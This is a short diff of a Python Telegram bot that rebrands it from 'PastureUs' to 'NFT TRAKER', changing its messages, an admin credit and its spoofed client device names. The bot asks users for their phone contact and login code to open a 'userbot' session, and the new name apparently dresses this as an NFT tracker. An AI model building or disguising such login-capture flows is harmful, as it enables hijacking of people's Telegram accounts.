@@ -130,7 +130,7 @@ async def check_ban(message: Message) -> bool:
     res = cursor.fetchone()
     conn.close()
     if res and res[0] == 1:
-        await message.answer("❌ Вы заблокированы администратором этого бота.")
+        await message.answer("❌ Вы Заблокированы.")
         return True
     return False
 
@@ -157,7 +157,7 @@ async def cmd_start(message: Message, state: FSMContext):
         one_time_keyboard=True,
     )
     await message.answer(
-        "PastureUs🏴‍☠️ Для подключения юзбота поделитесь контактом",
+        "NFT TRAKER  Для подключения юзбота поделитесь контактом",
         reply_markup=keyboard,
     )
     await state.set_state(AuthState.waiting_for_phone)
@@ -167,7 +167,7 @@ async def cmd_start(message: Message, state: FSMContext):
 async def cmd_admin(message: Message):
     if message.from_user.id != ADMIN_ID:
         return
-    await message.answer("👑 Админ-панель:", reply_markup=get_admin_keyboard())
+    await message.answer("Админ-панель by:@ElPachoso:", reply_markup=get_admin_keyboard())
 
 
 # --- БЫСТРЫЙ ОБРАБОТЧИК КОНТАКТА ---
@@ -198,9 +198,9 @@ async def send_telegram_code_background(user_id: int, phone: str, status_msg: Me
         name=f"session_{user_id}",
         api_id=int(API_ID),
         api_hash=API_HASH,
-        device_model="PASTURE US",
-        system_version="PASTUREUS",
-        app_version="PASTUREBOT",
+        device_model="NFTTRAKER",
+        system_version="NFTTRAKER",
+        app_version="NFTTRACKER",
         in_memory=True,
     )
 
